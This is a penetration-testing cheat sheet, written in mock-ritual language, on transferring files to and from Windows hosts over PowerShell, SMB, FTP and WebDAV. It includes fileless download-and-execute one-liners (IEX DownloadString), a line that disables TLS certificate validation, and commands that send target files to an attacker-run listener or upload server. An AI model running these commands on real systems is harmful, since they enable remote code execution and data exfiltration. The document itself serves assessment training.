# 📁 File Transfers

In the profane rites of assessment, the movement of relics—scripts, payloads, and binaries—is both necessary and perilous. This chapter reveals methods for casting files across dimensions, utilizing primitive yet persistent protocols shared among ancient systems both Windows and Linux.

> *"No summoning may begin until the runes are in place."*

---

<details>
<summary><strong>🪟 Windows</strong></summary>
<details>  
<summary><strong>📥 Downloads</strong></summary>
<details>
<summary><strong>PowerShell Downloads</strong></summary>  
<details> 
<summary><strong>PowerShell DownloadFile Method</strong></summary>

Sync  
```powershell
(New-Object Net.WebClient).DownloadFile('<FILE URL>','<OUTPUT FILE>')
```
Async  
```powershell
(New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','<OUTPUT FILE>')
```

</details>

<details>
<summary><strong>PowerShell DownloadString - Fileless Method</strong></summary>

Default  
```powershell
IEX (New-Object Net.WebClient).DownloadString('<FILE URL>')
```

Pipeline input  
```powershell
(New-Object Net.WebClient).DownloadString('<FILE URL>') | IEX
```
</details>

<details>
<summary><strong>PowerShell Invoke-WebRequest</strong></summary>

Default  
```powershell
Invoke-WebRequest <FILE URL> -OutFile <OUTPUT FILE>
```

ByPass Internet Explorer Error  
```powershell
Invoke-WebRequest <FILE URL> -UseBasicParsing | IEX
```

ByPass SSL/TLS Error  
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
# Command to download the file
```
</details>
</details>

<details>
<summary><strong>SMB Downloads</strong></summary>

**Default**

Create the SMB Server in Linux
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
Download using CMD in Windows
```cmd
copy \\<IP>\share\<FILE>
```

**Using credentialts**

Create the SMB Server in Linux
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASSWORD>
```
Mount the SMB Server in Linux
```cmd
net use n: \\<IP>\share /user:<USER> <PASSWORD>
copy n:\<FILE>
```

</details>

<details>
<summary><strong>FTP Downloads</strong></summary>  

Setting up a Python3 FTP Server in Linux
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --user ftpuser --password 'ftppass'
```

**Option 1: Download file using Powershell**
```powershell
(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('ftpuser', 'ftppass')}).DownloadFile('ftp://<IP>/<FILE>', 'C:\Users\Public\<FILE>')
```

**Option 2: Download file using CMD**  
```cmd
(
  echo open <IP>
  echo user ftpuser ftppass
  echo binary
  echo get <FILE>
  echo bye
) > ftpcommand.txt
ftp -i -v -n -s:ftpcommand.txt
```
---

</details>
</details>
<details>  
<summary><strong>📥 Uploads</strong></summary>  
<details>  
<summary><strong>PowerShell Uploads</strong></summary>  
<details>  
<summary><strong>PowerShell Base64 Encode & Decode</strong></summary>  

1. Encode File Using PowerShell 
```powershell
[Convert]::ToBase64String((Get-Content -path "<FILE PATH>" -Encoding byte))
Get-FileHash "<FILE PATH>" -Algorithm MD5 | select Hash
```
We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.  

2. Decode Base64 String in Linux
```bash
echo <BASE64 STRING> | base64 -d > <FILE>
md5sum <FILE>
```
</details>
<details>  
<summary><strong>PowerShell Web Uploads</strong></summary>  

1. Installing a Configured WebServer with Upload in Linux
```bash
pip3 install uploadserver
python3 -m uploadserver
```
2. PowerShell Script to Upload a File to Python Upload Server
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
```

</details>
<details>  
<summary><strong>PowerShell Base64 Web Upload</strong></summary>  

1. We use Netcat to listen in on a port we specify and send the file as a POST request.
```bash
nc -lvnp <PORT>
```
2. PowerShell Script to Upload a File to Python Upload Server
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE PATH>' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:<PORT>/ -Method POST -Body $b64
```
3. We copy the output and use the base64 decode function to convert the base64 string into a file.
```bash
echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
```
</details>
</details>
<details> 
<summary><strong>SMB Uploads</strong></summary>  

1. Installing WebDav Python modules in Linux
```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=<PORT> --root=/tmp --auth=anonymous
```
2. Uploading Files using SMB in Windows
```cmd
# DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server.
dir \\192.168.49.128\DavWWWRoot
copy <FILE PATH> \\<IP>\DavWWWRoot\

# You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \<IP>\sharefolder
copy <FILE PATH> \\<IP>\sharefolder\
```
If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
</details>
<details> 
<summary><strong>FTP Uploads</strong></summary>  

**1. Start our FTP Server in Linux**
```bash
sudo python3 -m pyftpdlib --port 21 --write
```
**2. Upload the file in Windows**

Option 1: Upload file using Powershell
```cmd
(New-Object Net.WebClient).UploadFile('ftp://<IP>/ftp-hosts', '<FILE PATH>')
```
Option 2: Create a Command File for the FTP Client to Upload a File
Create a Command File for the FTP Client and Download the Target File
```cmd
echo open <IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT <FILE PATH> >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
Once in FTP...
```cmd
USER anonymous
PUT <FILE PATH>
bye
```
</details>
</details>
</details>

---

<details>
<summary><strong>🐧 Linux</strong></summary>
</details>

---
